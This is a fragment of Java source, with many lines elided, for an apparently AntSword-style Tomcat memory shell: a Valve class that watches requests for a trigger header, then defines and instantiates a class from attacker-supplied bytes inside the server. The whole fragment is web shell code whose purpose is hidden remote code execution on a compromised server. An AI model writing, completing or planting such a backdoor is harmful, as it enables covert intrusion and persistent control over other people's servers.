 ...
 * @since 2025/02/18
 */
public class AntSwordValve7 extends ClassLoader implements Valve {
    ...
    public AntSwordValve7(ClassLoader z) {
        super(z);
    }
    ...
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            if (request.getHeader(headerName) != null
                ...
                Object instance = (new AntSwordValve7(this.getClass().getClassLoader())).g(bytes).newInstance();
